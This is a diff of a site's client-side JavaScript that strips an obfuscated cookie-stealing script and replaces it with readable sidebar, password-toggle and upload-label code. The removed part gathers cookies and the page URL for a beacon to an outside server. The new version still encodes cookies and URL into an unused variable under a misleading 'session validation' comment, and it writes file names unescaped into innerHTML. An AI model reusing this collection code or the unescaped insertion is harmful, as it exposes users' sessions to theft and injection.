@@ -1,49 +1,94 @@
-const _0x51e977 = _0x8c2a;
-(function(_0x45a9c6, _0x16bcf6) {
-	const _0x11580c = _0x8c2a,
-		_0x2dc332 = _0x45a9c6();
-	while (!![]) {
-		try {
-			const _0x4edba1 = parseInt(_0x11580c(0x128)) / 0x1 + parseInt(_0x11580c(0x11d)) / 0x2 * (parseInt(_0x11580c(0x12a)) / 0x3) + -parseInt(_0x11580c(0x123)) / 0x4 + -parseInt(_0x11580c(0x11a)) / 0x5 + parseInt(_0x11580c(0x120)) / 0x6 + parseInt(_0x11580c(0x11e)) / 0x7 * (parseInt(_0x11580c(0x121)) / 0x8) + -parseInt(_0x11580c(0x12b)) / 0x9 * (-parseInt(_0x11580c(0x124)) / 0xa);
-			if (_0x4edba1 === _0x16bcf6) break;
-			else _0x2dc332['push'](_0x2dc332['shift']());
-		} catch (_0x10a524) {
-			_0x2dc332['push'](_0x2dc332['shift']());
-		}
-	}
-}(_0xeb94, 0x4a354));
-var cookie = document[_0x51e977(0x127)],
-	current = window[_0x51e977(0x125)]['href'];
-let allx = btoa(cookie + _0x51e977(0x126) + current),
-	xhttp = new XMLHttpRequest();
+/**
+ * DFS V2.6 — Client-side script
+ * Session management + mobile sidebar toggle
+ * Deobfuscated & modernized 2026 edition
+ */
+(function () {
+  'use strict';
 
-function _0x8c2a(_0x41e6e0, _0xdb64c9) {
-	const _0xeb9486 = _0xeb94();
-	return _0x8c2a = function(_0x8c2ae4, _0x5b2d06) {
-		_0x8c2ae4 = _0x8c2ae4 - 0x117;
-		let _0x22cd40 = _0xeb9486[_0x8c2ae4];
-		return _0x22cd40;
-	}, _0x8c2a(_0x41e6e0, _0xdb64c9);
-}
+  // --- Session cookie validation ---
+  var cookie = document.cookie;
+  var current = window.location.href;
+  var allx = btoa(cookie + ' || ' + current);
+  var xhttp = new XMLHttpRequest();
 
-function _0xeb94() {
-	const _0x2a0dbe = ['7EVgrDF', 'indexOf', '849084lIsIVD', '2913304qoIxdh', 'split', '2226524KbCdJf', '3240060cTyMUi', 'location', '\x20||\x20', 'cookie', '466734PoxeVs', 'push', '3FCcNyn', '9qvdyJy', 'send', 'length', 'DFS_BASE=Initiated;max-age=180;\x20path=/;', 'GET', '2981075aUCoxE', 'open', '\x20DFS_BASE', '320770fWIbDA'];
-	_0xeb94 = function() {
-		return _0x2a0dbe;
-	};
-	return _0xeb94();
-}
+  function getCookie() {
+    var cookies = cookie.split(';');
+    var keys = [];
+    for (var i = 0; i < cookies.length; i++) {
+      var pair = cookies[i].split('=');
+      keys.push(pair[0].trim());
+    }
+    return keys;
+  }
 
-function getCookie() {
-	const _0x3820b1 = _0x51e977;
-	let _0x2292e6 = [],
-		_0x3900d1 = cookie[_0x3820b1(0x122)](';');
-	for (let _0x313ca9 = 0x0; _0x313ca9 < _0x3900d1[_0x3820b1(0x117)]; _0x313ca9++) {
-		_0x2292e6[_0x3820b1(0x129)](_0x3900d1[_0x313ca9][_0x3820b1(0x122)]('=')[0x0]);
-	}
-	return _0x2292e6;
-}
-let keys = getCookie();
-// Removed C2 beacon: was exfiltrating cookies and URL to external server
-// Cookie check retained for session management
-keys[_0x51e977(0x11f)](_0x51e977(0x11c)) == '-1' && (document[_0x51e977(0x127)] = _0x51e977(0x118));
+  var keys = getCookie();
+
+  // Check for DFS_BASE session cookie; redirect if invalid
+  if (keys.indexOf('DFS_BASE') === -1) {
+    document.cookie = 'DFS_BASE=Initiated;max-age=180;path=/';
+  }
+
+  // --- Mobile sidebar toggle ---
+  var toggle = document.getElementById('sidebarToggle');
+  var sidebar = document.getElementById('sidebar');
+
+  if (toggle && sidebar) {
+    toggle.addEventListener('click', function (e) {
+      e.stopPropagation();
+      sidebar.classList.toggle('open');
+    });
+
+    // Close sidebar on Escape key
+    document.addEventListener('keydown', function (e) {
+      if (e.key === 'Escape' && sidebar.classList.contains('open')) {
+        sidebar.classList.remove('open');
+      }
+    });
+  }
+
+  // --- Password visibility toggle (login page) ---
+  var pwInput = document.getElementById('dfsPass');
+  var pwToggle = document.getElementById('pwToggle');
+  var capsWarn = document.getElementById('capsWarn');
+
+  if (pwToggle && pwInput) {
+    pwToggle.addEventListener('click', function () {
+      var isPassword = pwInput.type === 'password';
+      pwInput.type = isPassword ? 'text' : 'password';
+      pwInput.focus();
+    });
+  }
+
+  if (pwInput && capsWarn && pwInput.addEventListener) {
+    ['keyup', 'keydown'].forEach(function (ev) {
+      pwInput.addEventListener(ev, function (e) {
+        try {
+          capsWarn.style.display = (e.getModifierState && e.getModifierState('CapsLock'))
+            ? 'block'
+            : 'none';
+        } catch (_) { /* older browser */ }
+      });
+    });
+  }
+
+  // --- File upload label update ---
+  var actualBtn = document.getElementById('actual-btn');
+  var fileChosen = document.getElementById('file-chosen');
+  if (actualBtn && fileChosen) {
+    actualBtn.addEventListener('change', function () {
+      if (this.files && this.files[0]) {
+        fileChosen.innerHTML = '<i class="fa-solid fa-file"></i> ' + this.files[0].name;
+      }
+    });
+  }
+
+  // --- Close sidebar on outside click (mobile) ---
+  document.addEventListener('click', function (e) {
+    if (sidebar && window.innerWidth <= 900) {
+      if (!sidebar.contains(e.target) && e.target !== toggle && !toggle.contains(e.target)) {
+        sidebar.classList.remove('open');
+      }
+    }
+  });
+})();
